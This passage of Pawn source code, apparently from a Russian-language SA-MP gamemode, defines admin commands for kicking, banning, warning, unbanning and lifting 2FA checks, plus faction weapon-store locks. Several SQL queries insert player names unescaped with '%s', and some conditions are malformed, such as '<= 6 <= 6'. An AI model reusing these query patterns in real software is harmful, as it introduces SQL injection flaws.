	format(YCMDstr, sizeof(YCMDstr), " %s шепнул(а): %s", Name(playerid),params[0]);
	ProxDetector(1.0, playerid, YCMDstr,0x6e6e6e6e,0x6e6e6e6e,0x6e6e6e6e,0x6e6e6e6e,0x6e6e6e6e);
	Flood[playerid] = 1;
	SetPVarInt(playerid,"Flood",0);
	return true;
}
CMD:kick(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 1 || dostup[playerid] == 0) return true;
//	if(Spectate[playerid]) StopSpectate(playerid);
	if(sscanf(params, "us[64]",params[0],params[1])) return	SCM(playerid, -1, " Введите: /kick [playerid] [причина]");
	if(!IsPlayerConnected(params[0])) return true;
	//if(GetPlayerState(params[0]) != 1 && GetPlayerState(params[0]) != 2 && GetPlayerState(params[0]) != 3) return SCM(playerid, COLOR_GRAD1, "Игрок оффлайн / не залогинен");
	if(PTEMP[params[0]][pAdmin] >= 7 && PTEMP[playerid][pAdmin] < PTEMP[params[0]][pAdmin])
	{
	 	return SCM(playerid, COLOR_GREY, " Его нельзя");
	}
	if(PTEMP[params[0]][pAdmin] > 0 && PTEMP[params[0]][pAdmin] <= 6 && PTEMP[playerid][pAdmin] < 7)
	{
		SCM(playerid, COLOR_LIGHTRED, " Вы были кикнуты за кик администратора.");
		Kick(playerid);
	}
	format(YCMDstr, sizeof(YCMDstr), " Администратор: %s кикнул %s. Причина: %s",Name(playerid),Name(params[0]),params[1]);
	SendClientMessageToAll(COLOR_LIGHTRED, YCMDstr);
	Kick(params[0]);
	return true;
}
CMD:skick(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
//	if(Spectate[playerid]) StopSpectate(playerid);
	if(PTEMP[playerid][pAdmin] < 4 || dostup[playerid] == 0) return true;
	if(sscanf(params, "u",params[0])) return SCM(playerid, -1, " Введите: /skick [playerid]");
	if(!IsPlayerConnected(params[0])) return true;
	//if(GetPlayerState(params[0]) != 1 && GetPlayerState(params[0]) != 2 && GetPlayerState(params[0]) != 3) return SCM(playerid, COLOR_GRAD1, "Игрок оффлайн / не залогинен");
    if(PTEMP[params[0]][pAdmin] >= 7 && PTEMP[playerid][pAdmin] < PTEMP[params[0]][pAdmin])
	{
	 	return SCM(playerid, COLOR_GREY, " Его нельзя");
	}
	if(PTEMP[params[0]][pAdmin] > 0 && PTEMP[params[0]][pAdmin] <= 6 <= 6 && PTEMP[playerid][pAdmin] < 7)
	{
		SCM(playerid, COLOR_LIGHTRED, " Вы были кикнуты за кик администратора.");
		Kick(playerid);
	}
	Kick(params[0]);
	SCM(playerid, COLOR_LIGHTRED, " Игрок кикнут");
	return true;
}
CMD:delaccount(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	if(sscanf(params, "s[128]",params[0])) return SCM(playerid,COLOR_GREY, " Введите: /delaccount [name]");
	mysql_format(DATABASE, QUERY, 256, "SELECT * FROM `"TABLE_ACCOUNTS"` WHERE `Name` = '%e'",params[0]);
	mysql_function_query(DATABASE, QUERY, true, "DellAccount", "ds",playerid, params[0]);
	return true;
}
CMD:ioffban(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 4 || dostup[playerid] == 0) return true;
	new year1, month1, day1, hour1, minute1, second1;
	getdate(year1, month1, day1);
	gettime(hour1, minute1, second1);
	new ban_name[24],ban_reason[60];
	if(sscanf(params, "s[24]s[60]",ban_name,ban_reason)) return SCM(playerid, -1, " Введите: /ioffban [ник] [причина]");
	if(!CanBan(ban_name)) return SCM(playerid, COLOR_GREY, " Его нельзя");
	format(YCMDstr, sizeof(YCMDstr), " IOffBan[забанил: %s][забанен: %s][Причина: %s][%02i/%02i/%02i  %02i:%02i:%02i]",Name(playerid),ban_name,ban_reason, year1,month1,day1,hour1, minute1, second1);
	ABroadCast(COLOR_LIGHTRED,YCMDstr,1);
	mysql_format(DATABASE,QUERY, 300, "INSERT INTO `"TABLE_BAN"` (`Text`, `Name`, `NameAdmin`, `Date`, `Unban`, `Reason`) VALUES ('IOffBan', '%s', '%s', '%i', '%i', '%s')",ban_name,Name(playerid),gettime(), mktimes(5,0,0,day1,month1,2038),ban_reason);
	mysql_function_query(DATABASE,QUERY,false,"","");
	printf("Администратор %s забанил навсегда в оффлайн-режиме %s. Причина: %s", PTEMP[playerid][pName], ban_name, ban_reason);
	return true;
}
CMD:sban(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
//	if(Spectate[playerid]) StopSpectate(playerid);
	if(PTEMP[playerid][pAdmin] < 4 || dostup[playerid] == 0) return true;
	new ban_reason[60];
	if(sscanf(params, "u[128]s[60]",params[0],ban_reason)) return	SCM(playerid, -1, " Введите: /sban [playerid] [причина]");
	if(!IsPlayerConnected(params[0])) return true;
	//if(PTEMP[params[0]][pAdmin] > 6)  return SCM(playerid, COLOR_GREY, " Ошибка. Администратора с данным уровнем заварнить невозможно!");
	//if(GetPlayerState(params[0]) != 1 && GetPlayerState(params[0]) != 2 && GetPlayerState(params[0]) != 3) return SCM(playerid, COLOR_GRAD1, "Игрок оффлайн / не залогинен");
	new ip[15];
	new year1, month1, day1, hour1, minute1, second1;
	getdate(year1, month1, day1);
	gettime(hour1, minute1, second1);
	GetPlayerIp(params[0],ip,15);
	if(PTEMP[params[0]][pAdmin] >= 7 && PTEMP[playerid][pAdmin] < PTEMP[params[0]][pAdmin])
	{
	 	return SCM(playerid, COLOR_GREY, " Его нельзя");
	}
	new names[32];
	GetPlayerName(params[0], names, 32);
	if(!CanBan(names)) return SCM(playerid, COLOR_GREY, " Его нельзя");
	if(PTEMP[params[0]][pAdmin] >= 1 && PTEMP[playerid][pAdmin] < 7 <= 6 && PTEMP[playerid][pAdmin] < 7)
	{
		format(YCMDstr, 128, " Администратор %s Забанен. Обратитесь к спец-админу", Name(playerid));
		mysql_format(DATABASE,QUERY, 128, "SELECT * FROM "TABLE_ADMIN" WHERE `name` = '%s'", Name(playerid));
		mysql_function_query(DATABASE,QUERY,true,"OnMySQL_QUERY","iis",17,0,Name(playerid));
		ABroadCast(COLOR_LIGHTRED,YCMDstr,1);
		Kick(playerid);
	}
	format(YCMDstr, sizeof(YCMDstr), "SBan[забанил: %s][забанен: %s][причина: %s][%i/%02i/%02i  %02i:%02i:%02i]",Name(playerid), Name(params[0]), ban_reason, year1,month1,day1,hour1, minute1,second1);
	ABroadCast(COLOR_LIGHTRED,YCMDstr,1);
	format(YCMDstr, sizeof(YCMDstr), "    Nik [%s]   R-IP [%s]   L-IP [%s]   IP [%s]",Name(params[0]),PTEMP[params[0]][pIpReg],PTEMP[params[0]][pvIp],ip);
	ABroadCast(COLOR_LIGHTRED,YCMDstr,2);
	new null;
	if(PTEMP[params[0]][pDonateRank] == 0) null = 30;
	if(PTEMP[params[0]][pDonateRank] == 1) null = 21;
	if(PTEMP[params[0]][pDonateRank] == 2) null = 14;
	if(PTEMP[params[0]][pDonateRank] == 3) null = 7;
	Kick(params[0]);
	mysql_format(DATABASE,QUERY, 300, "INSERT INTO `"TABLE_BAN"` (`Text`, `Name`, `NameAdmin`, `Date`, `Unban`, `Reason`) VALUES ('SBAN',  '%s', '%s', '%i', '%i', '%s')", Name(params[0]),Name(playerid),gettime(), mktimes(5,0,0,day1+null,month1,year1),ban_reason);
	mysql_function_query(DATABASE,QUERY,false,"","");
	printf("Администратор %s тихо забанил %s. Причина: %s", PTEMP[playerid][pName], PTEMP[params[0]][pName], ban_reason);
	return true;
}
CMD:offwarn(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 4 || dostup[playerid] == 0) return true;
	new strlen_params;
	strlen_params = strlen(params);
	if(strlen_params < 1 || strlen_params > 84) return SCM(playerid, -1, " Введите: /offwarn [name] [reason]");
	new warn_name[24], warn_reason[60];
	if(sscanf(params, "s[24]s[60]", warn_name, warn_reason)) return SCM(playerid, -1, " Введите: /offwarn [name] [reason]");
	if(!CanBan(warn_name)) return SCM(playerid, COLOR_GREY, " Его нельзя");
	mysql_format(DATABASE, QUERY, 62, "SELECT * FROM accounts WHERE Name='%e'", warn_name);
	new Cache:result = mysql_query(DATABASE, QUERY);
	if(cache_num_rows())
	{
		new warns = cache_get_field_content_int(0, "pWarns");
		new year1, month1, day1, hour1, minute1, second1;
		getdate(year1, month1, day1);
		gettime(hour1, minute1, second1);
		format(YCMDstr, sizeof(YCMDstr), "OffWarn[заварнил: %s][заварнен: %s][Причина: %s][%i/%i/%i  %i:%i]",Name(playerid),warn_name,warn_reason,day1,month1,year1,hour1, minute1);
		ABroadCast(COLOR_LIGHTRED,YCMDstr,1);
		mysql_format(DATABASE,QUERY, 256, "UPDATE accounts SET pLeader = '0',pMember = '0',pRank = '0',pJob = '0',OffWarns = '%i',punWarns = '%i',pWarns = '%i' WHERE name = '%s'",gettime()+1218400, mktimes(0, 0, 0, day1+30, month1, year1), warns+1, warn_name);
		mysql_function_query(DATABASE,QUERY,false,"","");
	}
	else SCM(playerid, -1, " Игрок не найден");
	printf("Администратор %s заварнил %s в оффлайн-режиме. Причина: %s", PTEMP[playerid][pName], warn_name, warn_reason);
	return cache_delete(result, DATABASE);
}
CMD:offban(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 4 || dostup[playerid] == 0) return true;
	new strlen_params;
	strlen_params = strlen(params);
	if(strlen_params < 1 || strlen_params > MAX_PLAYER_NAME+60) return SCM(playerid, -1, " Введите: /offban [name] [reason]");
	new ban_name[24],ban_reason[60];
	if(sscanf(params, "s[24]s[60]",ban_name,ban_reason)) return SCM(playerid, -1, " Введите: /offban [name] [reason]");
	if(!CanBan(ban_name)) return SCM(playerid, COLOR_GREY, " Его нельзя");
	new year1, month1, day1, hour1, minute1, second1;
	getdate(year1, month1, day1);
	gettime(hour1, minute1, second1);
	format(YCMDstr, sizeof(YCMDstr), " OffBan[забанил: %s][забанен: %s][Причина: %s][%i/%02i/%02i  %02i:%02i:%02i]",Name(playerid),ban_name,ban_reason,year1,month1,day1,hour1, minute1,second1);
	ABroadCast(COLOR_LIGHTRED,YCMDstr,1);
	mysql_format(DATABASE,QUERY, 300, "INSERT INTO `"TABLE_BAN"` (`Text`, `Name`, `NameAdmin`, `Date`, `Unban`,`Reason`) VALUES ('OffBan', '%s', '%s', '%i', '%i', '%s')",ban_name,Name(playerid),gettime(), mktimes(5,0,0,30,month1,year1),ban_reason);
	mysql_function_query(DATABASE,QUERY,false,"","");
	printf("Администратор %s забанил в оффлайн-режиме %s. Причина: %s", PTEMP[playerid][pName], ban_name, ban_reason);
	return true;
}
CMD:unban(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 5 || dostup[playerid] == 0) return true;
	if(sscanf(params, "s[128]",params[0])) return SCM(playerid, COLOR_GRAD1, " Введите: /unban [name]");
	mysql_format(DATABASE, QUERY, 62, "SELECT `Name` FROM `"TABLE_BAN"` WHERE `Name` = '%s'", params[0]);
	mysql_query(DATABASE, QUERY);
	new r = cache_num_rows();
	if(!r)
	{
	    return SCM(playerid, COLOR_GREY, " Аккаунт не найден!");
	}
	mysql_format(DATABASE,QUERY,128, "DELETE FROM `"TABLE_BAN"` WHERE `Name` = '%e'",params[0]);
	mysql_function_query(DATABASE,QUERY,false,"","");
	format(YCMDstr, sizeof(YCMDstr), " Admin: %s unbaned: %s",Name(playerid),params[0]);
	ABroadCast(COLOR_YELLOW,YCMDstr,1);
	printf("Администратор %s разбанил %s", PTEMP[playerid][pName], params[0]);
	return true;
}
CMD:offuninvite(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pLeader] > 0)
	{
		new params_name[24];
		if(sscanf(params, "s[24]", params_name)) return SCM(playerid, -1, " Введите: /offUninvite [Имя]");
		mysql_format(DATABASE, QUERY, 62, "SELECT * FROM "TABLE_ACCOUNTS" WHERE Name='%e' and pMember = '%d' and pLeader = '0'", params_name,PTEMP[playerid][pMember]);
		mysql_query(DATABASE, QUERY);
		if(cache_num_rows())
		{
			SendMes(playerid,COLOR_BLUE," Вы выгнали %s из организации",params_name);
			format(YCMDstr, sizeof(YCMDstr), " Лидер: %s offUninvite: %s",Name(playerid),params[0]);
			ABroadCast(COLOR_YELLOW,YCMDstr,5);
			printf(YCMDstr);
			mysql_format(DATABASE,QUERY, 256, "UPDATE accounts SET pText = '9', pLeader = '0',pMember = '0',pRank = '0',pJobHeal = '0' WHERE name = '%s'",params_name);
			mysql_function_query(DATABASE,QUERY,false,"","");
		}
		else SCM(playerid, -1, " Ошибка: Игрок не в вашей фракции");
	}
	else if(PTEMP[playerid][pAdmin] >= 5)
	{
	    if(sscanf(params, "s[128]",params[0])) return SCM(playerid, -1, " Введите: /offUninvite [name]");
		new year, month, day, hour, minute, second;
		getdate(year, month, day);
		gettime(hour, minute, second);
		mysql_format(DATABASE,QUERY, 256, "UPDATE accounts SET pLeader = '0',pMember = '0',pRank = '0',pText = '9',pJobHeal = '0' WHERE name = '%s'",params[0]);
		mysql_function_query(DATABASE,QUERY,false,"","");
		format(YCMDstr, sizeof(YCMDstr), " Admin: %s offUninvite: %s",Name(playerid),params[0]);
		ABroadCast(COLOR_YELLOW,YCMDstr,5);
		printf(YCMDstr);
	}
	return true;
}
CMD:offip(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 9 || dostup[playerid] == 0) return true;
	if(sscanf(params, "s[128]",params[0])) return SCM(playerid, COLOR_GRAD1, " Введите: /offip [name]");
	mysql_format(DATABASE,QUERY,128, "UPDATE accounts SET pCheckIp = '0', pGoogleIP ='0' WHERE name = '%s'",params[0]);
	mysql_function_query(DATABASE,QUERY,false,"","");
	format(YCMDstr, sizeof(YCMDstr), " Администратор: %s снял IP и Google Authenticator проверку с %s",Name(playerid),params[0]);
	ABroadCast(COLOR_LIGHTRED,YCMDstr,1);
	return true;
}
CMD:offgoogleauth(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 9 || dostup[playerid] == 0) return true;
	if(sscanf(params, "s[128]",params[0])) return SCM(playerid, COLOR_GRAD1, " Введите: /offGoogleAuth [name]");
	mysql_format(DATABASE,QUERY,128, "UPDATE accounts SET pGoogleIP = '0' WHERE name = '%s'",params[0]);
	mysql_function_query(DATABASE,QUERY,false,"","");
	format(YCMDstr, sizeof(YCMDstr), " Администратор: %s снял Google Authenticator проверку с %s",Name(playerid),params[0]);
	ABroadCast(COLOR_LIGHTRED,YCMDstr,1);
	if(GetPlayerID(params[0]) != INVALID_PLAYER_ID)
	PTEMP[GetPlayerID(params[0])][pGoogleIP] = 0;
	return true;
}
CMD:realodbans(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 9 || dostup[playerid] == 0) return true;
	SendRconCommand("reloadbans");
	SCM(playerid, -1, " Бан-лист перезагружен.");
	return true;
}
CMD:warelock(playerid)
{
	if(!PTEMP[playerid][pLogin]) return true;
    if(Flood[playerid] > 0)
	{
		SetPVarInt(playerid,"Flood",GetPVarInt(playerid,"Flood")+2);
  		if(GetPVarInt(playerid,"Flood") >= 5) kick(playerid);
  		SCM(playerid, 0xFFD5BBAA, " Не флуди!");
		return true;
	}
	if(!IsABiker(playerid) && !IsAMafia(playerid) && !IsAGang(playerid)) return SCM(playerid,COLOR_GREY," Доступно только криминалу");
	switch(PTEMP[playerid][pMember])
	{
		case 12:
		{
		    if(PTEMP[playerid][pRank] < 8) return SCM(playerid, COLOR_GREY, " Ранг должен быть выше");
			if(wareBallasLock == false)
			{
			    SCM(playerid, 0xff0606aa, " Склад закрыт");
				format(string, sizeof(string), " %s закрыл склад с оружием", Name(playerid));
				SendFamilyMessage(PTEMP[playerid][pMember],0xff0606aa,string);
				wareBallasLock = true;
			}
			else if(wareBallasLock == true)
			{
			    SCM(playerid, 0x57ff4fff, " Склад открыт");
				format(string, sizeof(string), " %s открыл склад с оружием", Name(playerid));
				SendFamilyMessage(PTEMP[playerid][pMember],0x57ff4fff,string);
				wareBallasLock = false;
			}
		}
		case 13:
		{
  			if(PTEMP[playerid][pRank] < 8) return SCM(playerid, COLOR_GREY, " Ранг должен быть выше");
			if(wareVagosLock == false)
			{
				SCM(playerid, 0xff0606aa, " Склад закрыт");
				format(string, sizeof(string), " %s закрыл склад с оружием", Name(playerid));
				SendFamilyMessage(PTEMP[playerid][pMember],0xff0606aa,string);
				wareVagosLock = true;
			}
			else if(wareVagosLock == true)
			{
			    SCM(playerid, 0x57ff4fff, " Склад открыт");
				format(string, sizeof(string), " %s открыл склад с оружием", Name(playerid));
				SendFamilyMessage(PTEMP[playerid][pMember],0x57ff4fff,string);
				wareVagosLock = false;
			}
		}
		case 15:
		{
  			if(PTEMP[playerid][pRank] < 8) return SCM(playerid, COLOR_GREY, " Ранг должен быть выше");
			if(wareGrooveLock == false)
			{
			    SCM(playerid, 0xff0606aa, " Склад закрыт");
				format(string, sizeof(string), " %s закрыл склад с оружием", Name(playerid));
				SendFamilyMessage(PTEMP[playerid][pMember],0xff0606aa,string);
				wareGrooveLock = true;
			}
			else if(wareGrooveLock == true)
			{
			    SCM(playerid, 0x57ff4fff, " Склад открыт");
				format(string, sizeof(string), " %s открыл склад с оружием", Name(playerid));
				SendFamilyMessage(PTEMP[playerid][pMember],0x57ff4fff,string);
				wareGrooveLock = false;
			}
		}
		case 17:
		{
  			if(PTEMP[playerid][pRank] < 8) return SCM(playerid, COLOR_GREY, " Ранг должен быть выше");
			if(wareAztecLock == false)
			{
			    SCM(playerid, 0xff0606aa, " Склад закрыт");
				format(string, sizeof(string), " %s закрыл склад с оружием", Name(playerid));
				SendFamilyMessage(PTEMP[playerid][pMember],0xff0606aa,string);
				wareAztecLock = true;
			}
			else if(wareAztecLock == true)
			{
			    SCM(playerid, 0x57ff4fff, " Склад открыт");
				format(string, sizeof(string), " %s открыл склад с оружием", Name(playerid));
				SendFamilyMessage(PTEMP[playerid][pMember],0x57ff4fff,string);
				wareAztecLock = false;
			}
		}
		case 18:
		{
  			if(PTEMP[playerid][pRank] < 8) return SCM(playerid, COLOR_GREY, " Ранг должен быть выше");
			if(wareRifaLock == false)
			{
			    SCM(playerid, 0xff0606aa, " Склад закрыт");
				format(string, sizeof(string), " %s закрыл склад с оружием", Name(playerid));
				SendFamilyMessage(PTEMP[playerid][pMember],0xff0606aa,string);
				wareRifaLock = true;
			}
			else if(wareRifaLock == true)
			{
			    SCM(playerid, 0x57ff4fff, " Склад открыт");
				format(string, sizeof(string), " %s открыл склад с оружием", Name(playerid));
				SendFamilyMessage(PTEMP[playerid][pMember],0x57ff4fff,string);
				wareRifaLock = false;
			}
		}
		case 5://LCN
		{
  			if(PTEMP[playerid][pRank] < 8) return SCM(playerid, COLOR_GREY, " Ранг должен быть выше");
			if(wareLcnLock == false)
			{
			    SCM(playerid, 0xff0606aa, " Склад закрыт");
				format(string, sizeof(string), " %s закрыл склад с оружием", Name(playerid));
				SendFamilyMessage(PTEMP[playerid][pMember],0xff0606aa,string);
				wareLcnLock = true;
			}
			else if(wareLcnLock == true)
			{
			    SCM(playerid, 0x57ff4fff, " Склад открыт");
				format(string, sizeof(string), " %s открыл склад с оружием", Name(playerid));
				SendFamilyMessage(PTEMP[playerid][pMember],0x57ff4fff,string);
				wareLcnLock = false;
			}
		}
		case 6://Yakuza
		{
  			if(PTEMP[playerid][pRank] < 8) return SCM(playerid, COLOR_GREY, " Ранг должен быть выше");
			if(wareYakuzaLock == false)
			{
			    SCM(playerid, 0xff0606aa, " Склад закрыт");
				format(string, sizeof(string), " %s закрыл склад с оружием", Name(playerid));
				SendFamilyMessage(PTEMP[playerid][pMember],0xff0606aa,string);
				wareYakuzaLock = true;
			}
			else if(wareYakuzaLock == true)
			{
			    SCM(playerid, 0x57ff4fff, " Склад открыт");
				format(string, sizeof(string), " %s открыл склад с оружием", Name(playerid));
				SendFamilyMessage(PTEMP[playerid][pMember],0x57ff4fff,string);
				wareYakuzaLock = false;
			}
		}
		case 14://RM
		{
  			if(PTEMP[playerid][pRank] < 8) return SCM(playerid, COLOR_GREY, " Ранг должен быть выше");
			if(wareRmLock == false)
			{
			    SCM(playerid, 0xff0606aa, " Склад закрыт");
				format(string, sizeof(string), " %s закрыл склад с оружием", Name(playerid));
				SendFamilyMessage(PTEMP[playerid][pMember],0xff0606aa,string);
				wareRmLock = true;
			}
			else if(wareRmLock == true)
			{
			    SCM(playerid, 0x57ff4fff, " Склад открыт");
				format(string, sizeof(string), " %s открыл склад с оружием", Name(playerid));
				SendFamilyMessage(PTEMP[playerid][pMember],0x57ff4fff,string);
				wareRmLock = false;
			}
		}
		case 24://Hell's Angels MC
		{
  			if(PTEMP[playerid][pRank] < 7) return SCM(playerid, COLOR_GREY, " Ранг должен быть выше");
			if(wareHAMLock == false)
			{
			    SCM(playerid, 0xff0606aa, " Склад закрыт");
				format(string, sizeof(string), " %s закрыл склад с оружием", Name(playerid));
				SendFamilyMessage(PTEMP[playerid][pMember],0xff0606aa,string);
				wareHAMLock = true;
			}
			else if(wareHAMLock == true)
			{
				SCM(playerid, 0x57ff4fff, " Склад открыт");
				format(string, sizeof(string), " %s открыл склад с оружием", Name(playerid));
				SendFamilyMessage(PTEMP[playerid][pMember],0x57ff4fff,string);
				wareHAMLock = false;
			}
		}
		case 26://Warlocks MC
		{
  			if(PTEMP[playerid][pRank] < 7) return SCM(playerid, COLOR_GREY, " Ранг должен быть выше");
			if(wareWCMLock == false)
			{
			    SCM(playerid, 0xff0606aa, " Склад закрыт");
				format(string, sizeof(string), " %s закрыл склад с оружием", Name(playerid));
				SendFamilyMessage(PTEMP[playerid][pMember],0xff0606aa,string);
				wareWCMLock = true;
			}
			else if(wareWCMLock == true)
			{
			    SCM(playerid, 0x57ff4fff, " Склад открыт");
				format(string, sizeof(string), " %s открыл склад с оружием", Name(playerid));
				SendFamilyMessage(PTEMP[playerid][pMember],0x57ff4fff,string);
				wareWCMLock = false;
			}
		}
		case 29://Pagans MC
		{
  			if(PTEMP[playerid][pRank] < 7) return SCM(playerid, COLOR_GREY, " Ранг должен быть выше");
			if(warePMCLock == false)
			{
			    SCM(playerid, 0xff0606aa, " Склад закрыт");
				format(string, sizeof(string), " %s закрыл склад с оружием", Name(playerid));
				SendFamilyMessage(PTEMP[playerid][pMember],0xff0606aa,string);
				warePMCLock = true;
			}
			else if(warePMCLock == true)
			{
			    SCM(playerid, 0x57ff4fff, " Склад открыт");
				format(string, sizeof(string), " %s открыл склад с оружием", Name(playerid));
				SendFamilyMessage(PTEMP[playerid][pMember],0x57ff4fff,string);
				warePMCLock = false;
			}
		}
	}
	Flood[playerid] = 2;
	SetPVarInt(playerid,"Flood",0);
	return true;
}
//#8
CMD:warn(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
//	if(Spectate[playerid]) StopSpectate(playerid);
	if(PTEMP[playerid][pAdmin] < 2 || dostup[playerid] == 0) return true;
	if(sscanf(params, "us[128]",params[0],params[1])) return SCM(playerid, -1, " Введите: /warn [id/ник] [причина]");
	if(!IsPlayerConnected(params[0])) return true;
	//if(PTEMP[params[0]][pAdmin] > 6)  return SCM(playerid, COLOR_GREY, " Ошибка. Администратора с данным уровнем заварнить невозможно!");
	new year, month,day;
	getdate(year, month, day);
	if(PTEMP[params[0]][pAdmin] >= 7 && PTEMP[playerid][pAdmin] < PTEMP[params[0]][pAdmin])
	{
	 	return SCM(playerid, COLOR_GREY, " Его нельзя");
	}
	new names[32];
	GetPlayerName(params[0], names, 32);
	if(!CanBan(names)) return SCM(playerid, COLOR_GREY, " Его нельзя");
	if(PTEMP[params[0]][pAdmin] >= 1 && PTEMP[playerid][pAdmin] < 7)
	{
		format(YCMDstr, 128, " Администратор %s Забанен. Обратитесь к спец-админу", Name(playerid));
		mysql_format(DATABASE,QUERY, 128, "SELECT * FROM "TABLE_ADMIN" WHERE `name` = '%s'", Name(playerid));
		mysql_function_query(DATABASE,QUERY,true,"OnMySQL_QUERY","iis",17,0,Name(playerid));
		ABroadCast(COLOR_LIGHTRED,YCMDstr,1);
		Kick(playerid);
	}
	new null;
	if(PTEMP[params[0]][pDonateRank] == 0) null = 30;
	if(PTEMP[params[0]][pDonateRank] == 1) null = 21;
	if(PTEMP[params[0]][pDonateRank] == 2) null = 14;
	if(PTEMP[params[0]][pDonateRank] == 3) null = 7;
	PTEMP[params[0]][pWarns] += 1;
	if(PTEMP[params[0]][pWarns] >= 3)
	{
		new ip[32];
		format(YCMDstr, sizeof(YCMDstr), " Администратор: %s забанил %s [3 предупреждения]. Причина: %s",Name(playerid),Name(params[0]),params[1]);
		SendClientMessageToAll(COLOR_LIGHTRED, YCMDstr);
		GetPlayerIp(params[0],ip,sizeof(ip));
		format(YCMDstr, sizeof(YCMDstr), "    Nik [%s]   R-IP [%s]   L-IP [%s]   IP [%s]",Name(params[0]),PTEMP[params[0]][pIpReg],PTEMP[params[0]][pvIp],ip);
		ABroadCast(COLOR_LIGHTRED,YCMDstr,2);
		PTEMP[params[0]][pMember] = 0;
		PTEMP[params[0]][pLeader] = 0;
		PTEMP[params[0]][pJob] = 0;
		mysql_format(DATABASE,QUERY, 256, "INSERT INTO `"TABLE_BAN"` (`Text`, `Name`, `NameAdmin`, `Date`, `Unban`) VALUES ('3 WARNS', '%s', '%s', '%i', '%i')",Name(params[0]),Name(playerid),gettime(),mktimes(5,0,0,day+null,month,year));
		mysql_function_query(DATABASE,QUERY,false,"","");
		Kick(params[0]);
		return true;
	}
	format(YCMDstr, sizeof(YCMDstr), " Администратор: %s выдал warn %s. Причина: %s",Name(playerid),Name(params[0]),params[1]);
	SendClientMessageToAll(COLOR_LIGHTRED,YCMDstr);
	PTEMP[params[0]][pMember] = 0;
	PTEMP[params[0]][pLeader] = 0;
	PTEMP[params[0]][pJob] = 0;
	if(PTEMP[params[0]][pDonateRank] == 0) PTEMP[params[0]][OffWarns] = gettime()+1218400;
	if(PTEMP[params[0]][pDonateRank] == 1) PTEMP[params[0]][OffWarns] = gettime()+900000;
	if(PTEMP[params[0]][pDonateRank] == 2) PTEMP[params[0]][OffWarns] = gettime()+550000;
	if(PTEMP[params[0]][pDonateRank] == 3) PTEMP[params[0]][OffWarns] = gettime()+280000;
	PTEMP[params[0]][punWarns] = mktimes(0,0,0,day+null,month,year);
	Kick(params[0]);
	printf("Администратор %s заварнил %s. Причина: %s", PTEMP[playerid][pName], PTEMP[params[0]][pName], params[1]);
	return true;
}
CMD:unwarn(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	if(sscanf(params, "u",params[0])) return SCM(playerid, -1, " Введите: /unwarn [id]");
	if(!IsPlayerConnected(params[0])) return true;
	if(PTEMP[params[0]][pWarns] <= 0) {SCM(playerid, COLOR_RED, "Варнов нет"); return true;}
	PTEMP[params[0]][pWarns] = 0;
	PTEMP[params[0]][punWarns] = 0;
	format(YCMDstr, sizeof(YCMDstr), " Admin: %s unwarned: %s",Name(playerid),Name(params[0]));
	ABroadCast(0xFFFF00AA,YCMDstr,1);
	printf("Администратор %s разварнил %s", PTEMP[playerid][pName], params[0]);
	return true;
}
CMD:ban(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 2 || dostup[playerid] == 0) return true;
//	if(Spectate[playerid]) StopSpectate(playerid);
	new ban_reason[60];
	if(sscanf(params, "u[128]s[60]",params[0],ban_reason)) return SCM(playerid, -1, " Введите: /ban [playerid] [причина]");
	if(!IsPlayerConnected(params[0])) return SCM(playerid, COLOR_GREY, " Игрок оффлайн!");
	//if(PTEMP[params[0]][pAdmin] > 6)  return SCM(playerid, COLOR_GREY, " Ошибка. Администратора с данным уровнем забанить невозможно!");
	//mysql_format(DATABASE,QUERY, 128, "SELECT * FROM "TABLE_ADMIN" WHERE `name` = '%s'", Name(params[0]));
	//mysql_function_query(DATABASE,QUERY,true,"OnMySQL_QUERY","iis",77,0,Name(params[0]));
	new ip[15];
	new year, month,day;
	new null = 30;
	getdate(year, month, day);
	if(PTEMP[params[0]][pAdmin] >= 7 && PTEMP[playerid][pAdmin] < PTEMP[params[0]][pAdmin])
	{
	 	return SCM(playerid, COLOR_GREY, " Его нельзя");
	}
	new names[32];
	GetPlayerName(params[0], names, 32);
	if(!CanBan(names)) return SCM(playerid, COLOR_GREY, " Его нельзя");
	if(PTEMP[params[0]][pAdmin] >= 1 && PTEMP[playerid][pAdmin] < 7 && PTEMP[playerid][pAdmin] < 7)
	{
		format(YCMDstr, 128, " Администратор %s Забанен. Обратитесь к спец-админу", Name(playerid));
		mysql_format(DATABASE,QUERY, 128, "SELECT * FROM "TABLE_ADMIN" WHERE `name` = '%s'", Name(playerid));
		mysql_function_query(DATABASE,QUERY,true,"OnMySQL_QUERY","iis",17,0,Name(playerid));
		mysql_format(DATABASE,QUERY, 300, "INSERT INTO `"TABLE_BAN"` (`Text`, `Name`, `NameAdmin`, `Date`, `Unban`, `Reason`) VALUES ('AUTOBAN','%s', '%s', '%i', '%i', 'snyat')",Name(playerid),Name(playerid),gettime(), mktimes(5,0,0,day+null,month,2038));
		mysql_function_query(DATABASE,QUERY,false,"","");
		ABroadCast(COLOR_LIGHTRED,YCMDstr,1);
		Kick(playerid);
	}
